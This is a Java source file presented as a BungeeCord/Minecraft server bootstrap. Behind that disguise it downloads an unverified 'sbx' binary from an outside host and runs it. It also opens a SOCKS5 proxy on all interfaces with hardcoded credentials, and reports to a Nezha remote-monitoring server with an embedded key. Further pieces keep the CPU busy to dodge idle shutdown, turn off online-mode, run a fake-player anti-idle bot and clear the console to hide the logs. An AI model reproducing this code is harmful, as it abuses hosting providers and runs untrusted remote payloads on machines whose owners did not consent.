package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.zip.Deflater;
import java.util.zip.Inflater;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Thread fakePlayerThread;
    private static Thread cpuKeeperThread;
    private static Thread socks5Thread;
    private static Process minecraftProcess;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT",
        "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME",
        "SOCKS5_PORT", "SOCKS5_USER", "SOCKS5_PASS", "NODE_HOST"
    };

    // ══════════════════════════════════════════════════════
    //  BUILT-IN SOCKS5 SERVER
    // ══════════════════════════════════════════════════════
    static class Socks5Server implements Runnable {
        private final int port;
        private final String username; // empty = no auth
        private final String password;
        private final ExecutorService pool = Executors.newCachedThreadPool();

        Socks5Server(int port, String username, String password) {
            this.port = port;
            this.username = username;
            this.password = password;
        }

        private byte[] readBytes(InputStream in, int n) throws IOException {
            byte[] buf = new byte[n];
            int off = 0;
            while (off < n) {
                int r = in.read(buf, off, n - off);
                if (r == -1) throw new EOFException("Unexpected end of stream");
                off += r;
            }
            return buf;
        }


        @Override
        public void run() {
            try (ServerSocket server = new ServerSocket()) {
                server.setReuseAddress(true);
                server.bind(new InetSocketAddress("0.0.0.0", port));
                System.out.println(ANSI_GREEN + "[SOCKS5] Server listening on 0.0.0.0:" + port + ANSI_RESET);
                while (running.get()) {
                    try {
                        Socket client = server.accept();
                        pool.submit(() -> handleClient(client));
                    } catch (Exception e) {
                        if (running.get())
                            System.out.println(ANSI_RED + "[SOCKS5] Accept error: " + e.getMessage() + ANSI_RESET);
                    }
                }
            } catch (Exception e) {
                System.out.println(ANSI_RED + "[SOCKS5] Server error: " + e.getMessage() + ANSI_RESET);
            }
        }

        private void handleClient(Socket client) {
            try {
                client.setSoTimeout(30000);
                InputStream  cin  = client.getInputStream();
                OutputStream cout = client.getOutputStream();

                // ── Greeting ──────────────────────────────
                // +----+----------+----------+
                // |VER | NMETHODS | METHODS  |
                // +----+----------+----------+
                int ver = cin.read();
                if (ver != 5) { client.close(); return; }

                int nMethods = cin.read();
                byte[] methods = readBytes(cin, nMethods);

                boolean needAuth = !username.isEmpty();
                boolean clientSupportsAuth     = contains(methods, (byte)0x02);
                boolean clientSupportsNoAuth   = contains(methods, (byte)0x00);

                if (needAuth && !clientSupportsAuth) {
                    // no acceptable method
                    cout.write(new byte[]{0x05, (byte)0xFF});
                    client.close(); return;
                }
                if (!needAuth && !clientSupportsNoAuth && !clientSupportsAuth) {
                    cout.write(new byte[]{0x05, (byte)0xFF});
                    client.close(); return;
                }

                // ── Auth negotiation ──────────────────────
                if (needAuth) {
                    cout.write(new byte[]{0x05, 0x02}); // use username/password auth
                    // Sub-negotiation: 0x01 | ulen | uname | plen | passwd
                    int authVer = cin.read();
                    if (authVer != 1) { client.close(); return; }
                    int uLen = cin.read();
                    String uname = new String(readBytes(cin, uLen));
                    int pLen = cin.read();
                    String passwd = new String(readBytes(cin, pLen));
                    if (username.equals(uname) && password.equals(passwd)) {
                        cout.write(new byte[]{0x01, 0x00}); // success
                    } else {
                        cout.write(new byte[]{0x01, 0x01}); // failure
                        client.close(); return;
                    }
                } else {
                    cout.write(new byte[]{0x05, 0x00}); // no auth
                }

                // ── Request ───────────────────────────────
                // +----+-----+-------+------+----------+----------+
                // |VER | CMD |  RSV  | ATYP | DST.ADDR | DST.PORT |
                // +----+-----+-------+------+----------+----------+
                if (cin.read() != 5) { client.close(); return; } // VER
                int cmd  = cin.read(); // CMD
                cin.read();            // RSV
                int atyp = cin.read(); // ATYP

                if (cmd != 1) { // only CONNECT supported
                    cout.write(new byte[]{0x05, 0x07, 0x00, 0x01, 0,0,0,0, 0,0});
                    client.close(); return;
                }

                String destHost;
                if (atyp == 0x01) { // IPv4
                    byte[] ip = readBytes(cin, 4);
                    destHost = InetAddress.getByAddress(ip).getHostAddress();
                } else if (atyp == 0x03) { // domain
                    int len = cin.read();
                    destHost = new String(readBytes(cin, len));
                } else if (atyp == 0x04) { // IPv6
                    byte[] ip = readBytes(cin, 16);
                    destHost = InetAddress.getByAddress(ip).getHostAddress();
                } else {
                    cout.write(new byte[]{0x05, 0x08, 0x00, 0x01, 0,0,0,0, 0,0});
                    client.close(); return;
                }
                int destPort = ((cin.read() & 0xFF) << 8) | (cin.read() & 0xFF);

                // ── Connect to target ─────────────────────
                Socket target;
                try {
                    target = new Socket();
                    target.connect(new InetSocketAddress(destHost, destPort), 10000);
                } catch (Exception e) {
                    // Connection refused / host unreachable
                    cout.write(new byte[]{0x05, 0x05, 0x00, 0x01, 0,0,0,0, 0,0});
                    client.close(); return;
                }

                // ── Success reply ─────────────────────────
                byte[] localIP = ((InetSocketAddress) target.getLocalSocketAddress())
                        .getAddress().getAddress();
                int localPort = target.getLocalPort();
                ByteArrayOutputStream reply = new ByteArrayOutputStream();
                reply.write(new byte[]{0x05, 0x00, 0x00, 0x01});
                reply.write(localIP);
                reply.write((localPort >> 8) & 0xFF);
                reply.write(localPort & 0xFF);
                cout.write(reply.toByteArray());
                cout.flush();

                // ── Relay bidirectional ───────────────────
                client.setSoTimeout(0);
                target.setSoTimeout(0);
                InputStream  clientIn  = client.getInputStream();
                OutputStream clientOut = client.getOutputStream();
                InputStream  targetIn  = target.getInputStream();
                OutputStream targetOut = target.getOutputStream();
                Thread t1 = new Thread(() -> pipe(clientIn,  targetOut, client, target));
                Thread t2 = new Thread(() -> pipe(targetIn,  clientOut, target, client));
                t1.setDaemon(true); t2.setDaemon(true);
                t1.start(); t2.start();
                // wait for either side to close
                t1.join(); t2.join();

            } catch (Exception e) {
                // silent - normal disconnects
            } finally {
                try { client.close(); } catch (Exception ignored) {}
            }
        }

        /** Pipe bytes from in to out; close both sockets when done */
        private void pipe(InputStream in, OutputStream out, Socket a, Socket b) {
            try {
                byte[] buf = new byte[8192];
                int n;
                while ((n = in.read(buf)) != -1) {
                    out.write(buf, 0, n);
                    out.flush();
                }
            } catch (Exception ignored) {
            } finally {
                try { a.close(); } catch (Exception ignored) {}
                try { b.close(); } catch (Exception ignored) {}
            }
        }

        private boolean contains(byte[] arr, byte val) {
            for (byte b : arr) if (b == val) return true;
            return false;
        }
    }

    // ══════════════════════════════════════════════════════
    //  MAIN
    // ══════════════════════════════════════════════════════
    public static void main(String[] args) throws Exception
    {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0)
        {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower!" + ANSI_RESET);
            Thread.sleep(3000);
            System.exit(1);
        }

        try {
            Map<String, String> config = loadEnvVars();

            // Start built-in socks5 server
            startSocks5Server(config);

            // Start sbx (vmess+argo+nezha, unchanged)
            runSbxBinary(config);

            startCpuKeeper();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(115000);
            System.out.println(ANSI_GREEN + "SBX Services are running!" + ANSI_RESET);

            // Print socks5 connection info
            printSocks5Info(config);

            if (isMcServerEnabled(config)) {
                startMinecraftServer(config);
                System.out.println(ANSI_YELLOW + "\n[MC-Server] Waiting for server to fully start..." + ANSI_RESET);
                Thread.sleep(30000);
            }

            if (isFakePlayerEnabled(config)) {
                System.out.println(ANSI_YELLOW + "\n[FakePlayer] Preparing to connect..." + ANSI_RESET);
                waitForServerReady(config);
                startFakePlayerBot(config);
            }

            System.out.println(ANSI_GREEN + "\nThank you for using this script, Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();
        } catch (Exception e) {
            e.printStackTrace();
        }

        while (running.get()) {
            try {
                Thread.sleep(10000);
            } catch (InterruptedException e) {
                break;
            }
        }
    }

    private static void startSocks5Server(Map<String, String> config) {
        int    port = 1080;
        try { port = Integer.parseInt(config.getOrDefault("SOCKS5_PORT", "1080").trim()); }
        catch (Exception ignored) {}
        String user = config.getOrDefault("SOCKS5_USER", "");
        String pass = config.getOrDefault("SOCKS5_PASS", "");

        Socks5Server server = new Socks5Server(port, user, pass);
        socks5Thread = new Thread(server);
        socks5Thread.setDaemon(true);
        socks5Thread.start();
    }

    private static void printSocks5Info(Map<String, String> config) {
        String user = config.getOrDefault("SOCKS5_USER", "");
        String pass = config.getOrDefault("SOCKS5_PASS", "");
        String port = config.getOrDefault("SOCKS5_PORT", "1080");
        String host = config.getOrDefault("NODE_HOST", "");

        if (host.isEmpty()) {
            System.out.println(ANSI_YELLOW + "[SOCKS5] Tip: set NODE_HOST to your server domain/IP" + ANSI_RESET);
            host = "YOUR_SERVER_IP";
        }

        StringBuilder url = new StringBuilder("socks5://");
        if (!user.isEmpty()) {
            url.append(user);
            if (!pass.isEmpty()) url.append(":").append(pass);
            url.append("@");
        }
        url.append(host).append(":").append(port);

        System.out.println(ANSI_GREEN + "================================" + ANSI_RESET);
        System.out.println(ANSI_GREEN + "[SOCKS5] " + url                  + ANSI_RESET);
        System.out.println(ANSI_GREEN + "================================" + ANSI_RESET);
    }

    // ══════════════════════════════════════════════════════
    //  原版 sbx（完全不动）
    // ══════════════════════════════════════════════════════
    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }

    private static Map<String, String> loadEnvVars() throws IOException {
        Map<String, String> envVars = new HashMap<>();
        envVars.put("UUID", "a91ae69e-d78a-4d30-bf10-3780fc42c320");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "store.ubi.com");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Mc");
        envVars.put("DISABLE_ARGO", "true");
        envVars.put("MC_JAR", "server99.jar");
        envVars.put("MC_MEMORY", "512M");
        envVars.put("MC_ARGS", "");
        envVars.put("MC_PORT", "");
        envVars.put("FAKE_PLAYER_ENABLED", "false");
        envVars.put("FAKE_PLAYER_NAME", "laohu");
        envVars.put("SOCKS5_PORT", "50202");
        envVars.put("SOCKS5_USER", "shabi1100");
        envVars.put("SOCKS5_PASS", "erbi1100");
        envVars.put("NODE_HOST", "51.77.85.56");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) envVars.put(var, value);
        }

        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2 && Arrays.asList(ALL_ENV_VARS).contains(parts[0].trim()))
                    envVars.put(parts[0].trim(), parts[1].trim().replaceAll("^['\"]|['\"]$", ""));
            }
        }
        return envVars;
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://amd64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://amd64.sss.hidns.vip/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) throw new IOException("Failed to set executable permission");
        }
        return path;
    }

    private static void startCpuKeeper() {
        cpuKeeperThread = new Thread(() -> {
            while (running.get()) {
                try {
                    long start = System.currentTimeMillis();
                    while (System.currentTimeMillis() - start < 10) Math.sqrt(Math.random());
                    Thread.sleep(1000);
                } catch (InterruptedException e) { break; }
            }
        });
        cpuKeeperThread.setDaemon(true);
        cpuKeeperThread.start();
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
            }
        } catch (Exception ignored) {}
    }

    private static void stopServices() {
        if (minecraftProcess != null && minecraftProcess.isAlive()) {
            System.out.println(ANSI_YELLOW + "[MC-Server] Stopping..." + ANSI_RESET);
            minecraftProcess.destroy();
        }
        if (sbxProcess != null && sbxProcess.isAlive()) sbxProcess.destroy();
        if (fakePlayerThread != null && fakePlayerThread.isAlive()) fakePlayerThread.interrupt();
        if (cpuKeeperThread  != null && cpuKeeperThread.isAlive())  cpuKeeperThread.interrupt();
        if (socks5Thread     != null && socks5Thread.isAlive())     socks5Thread.interrupt();
    }

    private static boolean isMcServerEnabled(Map<String, String> config) {
        String jarName = config.get("MC_JAR");
        return jarName != null && !jarName.trim().isEmpty();
    }

    private static void startMinecraftServer(Map<String, String> config) throws Exception {
        String jarName   = config.get("MC_JAR");
        String memory    = config.getOrDefault("MC_MEMORY", "512M");
        String extraArgs = config.getOrDefault("MC_ARGS", "");
        int mcPort = 25565;
        try { if (config.get("MC_PORT") != null) mcPort = Integer.parseInt(config.get("MC_PORT").trim()); }
        catch (Exception e) {}
        config.put("MC_PORT", String.valueOf(mcPort));
        if (!memory.matches("\\d+[MG]")) memory = "512M";
        if (!Files.exists(Paths.get(jarName))) {
            System.out.println(ANSI_RED + "[MC-Server] Error: " + jarName + " not found!" + ANSI_RESET); return;
        }
        Path eulaPath = Paths.get("eula.txt");
        if (!Files.exists(eulaPath)) Files.write(eulaPath, "eula=true".getBytes());
        else if (!new String(Files.readAllBytes(eulaPath)).contains("eula=true"))
            Files.write(eulaPath, "eula=true".getBytes());
        Path propPath = Paths.get("server.properties");
        String props = Files.exists(propPath) ? new String(Files.readAllBytes(propPath))
                : "server-port=" + mcPort + "\nonline-mode=false\n";
        props = props.replaceAll("player-idle-timeout=\\d+", "player-idle-timeout=0");
        if (!props.contains("player-idle-timeout=")) props += "player-idle-timeout=0\n";
        props = props.replaceAll("server-port=\\d+", "server-port=" + mcPort);
        if (!props.contains("server-port=")) props += "\nserver-port=" + mcPort + "\n";
        if (props.contains("online-mode=true")) props = props.replace("online-mode=true", "online-mode=false");
        else if (!props.contains("online-mode=")) props += "online-mode=false\n";
        Files.write(propPath, props.getBytes());
        System.out.println(ANSI_GREEN + "\n=== Starting Minecraft Server ===" + ANSI_RESET);
        List<String> cmd = new ArrayList<>(Arrays.asList("java", "-Xms"+memory, "-Xmx"+memory));
        if (!extraArgs.trim().isEmpty()) cmd.addAll(Arrays.asList(extraArgs.split("\\s+")));
        cmd.addAll(Arrays.asList("-XX:+UseG1GC", "-XX:+DisableExplicitGC", "-jar", jarName, "nogui"));
        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.redirectErrorStream(true);
        minecraftProcess = pb.start();
        new Thread(() -> {
            try (BufferedReader r = new BufferedReader(new InputStreamReader(minecraftProcess.getInputStream()))) {
                String line; while ((line = r.readLine()) != null) System.out.println("[MC-Server] " + line);
            } catch (IOException ignored) {}
        }).start();
        Thread.sleep(3000);
    }

    private static boolean isFakePlayerEnabled(Map<String, String> config) {
        return "true".equalsIgnoreCase(config.get("FAKE_PLAYER_ENABLED"));
    }

    private static void waitForServerReady(Map<String, String> config) throws InterruptedException {
        int mcPort = getMcPort(config);
        System.out.println(ANSI_YELLOW + "[FakePlayer] Checking server status..." + ANSI_RESET);
        for (int i = 0; i < 60; i++) {
            Thread.sleep(5000);
            try (Socket s = new Socket()) {
                s.connect(new InetSocketAddress("127.0.0.1", mcPort), 3000);
                System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Server ready!" + ANSI_RESET);
                Thread.sleep(10000); return;
            } catch (Exception ignored) {}
        }
    }

    private static int getMcPort(Map<String, String> config) {
        try { return Integer.parseInt(config.getOrDefault("MC_PORT", "25565").trim()); }
        catch (Exception e) { return 25565; }
    }

    private static void startFakePlayerBot(Map<String, String> config) {
        String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "Steve");
        int mcPort = getMcPort(config);
        fakePlayerThread = new Thread(() -> {
            int failCount = 0;
            while (running.get()) {
                Socket socket = null; DataOutputStream out = null; DataInputStream in = null;
                try {
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Connecting..." + ANSI_RESET);
                    socket = new Socket();
                    socket.setReuseAddress(true); socket.setSoLinger(true, 0);
                    socket.setReceiveBufferSize(1024 * 1024 * 10);
                    socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                    socket.setSoTimeout(60000);
                    out = new DataOutputStream(socket.getOutputStream());
                    in  = new DataInputStream(new BufferedInputStream(socket.getInputStream()));

                    ByteArrayOutputStream hsBuf = new ByteArrayOutputStream();
                    DataOutputStream hs = new DataOutputStream(hsBuf);
                    writeVarInt(hs, 0x00); writeVarInt(hs, 774);
                    writeString(hs, "127.0.0.1"); hs.writeShort(mcPort); writeVarInt(hs, 2);
                    byte[] hsData = hsBuf.toByteArray();
                    writeVarInt(out, hsData.length); out.write(hsData); out.flush();

                    ByteArrayOutputStream lgBuf = new ByteArrayOutputStream();
                    DataOutputStream lg = new DataOutputStream(lgBuf);
                    writeVarInt(lg, 0x00); writeString(lg, playerName);
                    UUID uuid = UUID.nameUUIDFromBytes(("OfflinePlayer:" + playerName).getBytes("UTF-8"));
                    lg.writeLong(uuid.getMostSignificantBits()); lg.writeLong(uuid.getLeastSignificantBits());
                    byte[] lgData = lgBuf.toByteArray();
                    writeVarInt(out, lgData.length); out.write(lgData); out.flush();

                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Handshake & Login sent" + ANSI_RESET);
                    failCount = 0;

                    boolean configPhase = false, playPhase = false, compressionEnabled = false;
                    int compressionThreshold = -1;
                    long loginTime = System.currentTimeMillis();
                    long stayOnlineTime = 60000 + (long)(Math.random() * 60000);

                    while (running.get() && !socket.isClosed()) {
                        if (System.currentTimeMillis() - loginTime > stayOnlineTime) {
                            System.out.println(ANSI_YELLOW + "[FakePlayer] Reconnecting cycle (Anti-Idle)..." + ANSI_RESET);
                            break;
                        }
                        try {
                            int packetLength = readVarInt(in);
                            if (packetLength < 0 || packetLength > 100000000) throw new IOException("Bad packet size");
                            byte[] packetData;
                            if (compressionEnabled) {
                                int dataLength = readVarInt(in);
                                int compressedLength = packetLength - getVarIntSize(dataLength);
                                byte[] compressedData = new byte[compressedLength];
                                in.readFully(compressedData);
                                if (dataLength == 0) { packetData = compressedData; }
                                else if (dataLength > 8192) { packetData = null; }
                                else {
                                    try {
                                        Inflater inflater = new Inflater();
                                        inflater.setInput(compressedData);
                                        packetData = new byte[dataLength];
                                        inflater.inflate(packetData); inflater.end();
                                    } catch (Exception e) { packetData = null; }
                                }
                            } else {
                                packetData = new byte[packetLength]; in.readFully(packetData);
                            }
                            if (packetData == null) continue;

                            DataInputStream packetIn = new DataInputStream(new ByteArrayInputStream(packetData));
                            int packetId = readVarInt(packetIn);

                            if (!playPhase) {
                                if (!configPhase) {
                                    if (packetId == 0x03) {
                                        compressionThreshold = readVarInt(packetIn);
                                        compressionEnabled = compressionThreshold >= 0;
                                    } else if (packetId == 0x02) {
                                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Login Success" + ANSI_RESET);
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        writeVarInt(new DataOutputStream(ackBuf), 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        configPhase = true;
                                        ByteArrayOutputStream infoBuf = new ByteArrayOutputStream();
                                        DataOutputStream info = new DataOutputStream(infoBuf);
                                        writeVarInt(info, 0x00); writeString(info, "en_US");
                                        info.writeByte(10); writeVarInt(info, 0);
                                        info.writeBoolean(true); info.writeByte(127);
                                        writeVarInt(info, 1); info.writeBoolean(false);
                                        info.writeBoolean(true); writeVarInt(info, 0);
                                        sendPacket(out, infoBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                } else {
                                    if (packetId == 0x03) {
                                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Config Finished" + ANSI_RESET);
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        writeVarInt(new DataOutputStream(ackBuf), 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        playPhase = true;
                                    } else if (packetId == 0x04) {
                                        long id = packetIn.readLong();
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x04); ack.writeLong(id);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    } else if (packetId == 0x0E) {
                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                        DataOutputStream bufOut = new DataOutputStream(buf);
                                        writeVarInt(bufOut, 0x07); writeVarInt(bufOut, 0);
                                        sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                }
                            } else {
                                if (packetId >= 0x20 && packetId <= 0x30 && packetIn.available() == 8) {
                                    long keepAliveId = packetIn.readLong();
                                    ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                    DataOutputStream bufOut = new DataOutputStream(buf);
                                    writeVarInt(bufOut, 0x1B); bufOut.writeLong(keepAliveId);
                                    sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                }
                            }
                        } catch (java.net.SocketTimeoutException ignored) {
                        } catch (Exception e) {
                            System.out.println(ANSI_RED + "[FakePlayer] Packet error: " + e.getMessage() + ANSI_RESET);
                            break;
                        }
                    }
                } catch (Exception e) {
                    System.out.println(ANSI_RED + "[FakePlayer] Connection error: " + e.getMessage() + ANSI_RESET);
                    failCount++;
                } finally {
                    try { if (out != null) out.close(); } catch (Exception ignored) {}
                    try { if (in  != null) in.close();  } catch (Exception ignored) {}
                    try { if (socket != null && !socket.isClosed()) socket.close(); } catch (Exception ignored) {}
                }
                try {
                    long wait = failCount > 3
                            ? Math.min(10000 * (long)Math.pow(2, Math.min(failCount-3,5)), 300000)
                            : 10000;
                    Thread.sleep(wait);
                } catch (InterruptedException ex) { break; }
            }
        });
        fakePlayerThread.setDaemon(true);
        fakePlayerThread.start();
    }

    private static int getVarIntSize(int value) {
        int size = 0; do { size++; value >>>= 7; } while (value != 0); return size;
    }

    private static void sendPacket(DataOutputStream out, byte[] packet, boolean compress, int threshold) throws IOException {
        if (!compress || packet.length < threshold) {
            if (compress) {
                ByteArrayOutputStream buf = new ByteArrayOutputStream();
                DataOutputStream bufOut = new DataOutputStream(buf);
                writeVarInt(bufOut, 0); bufOut.write(packet);
                byte[] fp = buf.toByteArray();
                writeVarInt(out, fp.length); out.write(fp);
            } else {
                writeVarInt(out, packet.length); out.write(packet);
            }
        } else {
            byte[] comp = compressData(packet);
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            DataOutputStream bufOut = new DataOutputStream(buf);
            writeVarInt(bufOut, packet.length); bufOut.write(comp);
            byte[] fp = buf.toByteArray();
            writeVarInt(out, fp.length); out.write(fp);
        }
        out.flush();
    }

    private static byte[] compressData(byte[] data) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        Deflater d = new Deflater(); d.setInput(data); d.finish();
        byte[] buf = new byte[1024];
        while (!d.finished()) { int n = d.deflate(buf); out.write(buf, 0, n); }
        d.end(); return out.toByteArray();
    }

    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0) { out.writeByte((value & 0x7F) | 0x80); value >>>= 7; }
        out.writeByte(value & 0x7F);
    }

    private static void writeString(DataOutputStream out, String str) throws IOException {
        byte[] bytes = str.getBytes("UTF-8");
        writeVarInt(out, bytes.length); out.write(bytes);
    }

    private static int readVarInt(DataInputStream in) throws IOException {
        int value = 0, length = 0; byte b;
        do {
            b = in.readByte();
            value |= (b & 0x7F) << (length * 7);
            length++;
            if (length > 5) throw new IOException("VarInt too big");
        } while ((b & 0x80) == 0x80);
        return value;
    }
}
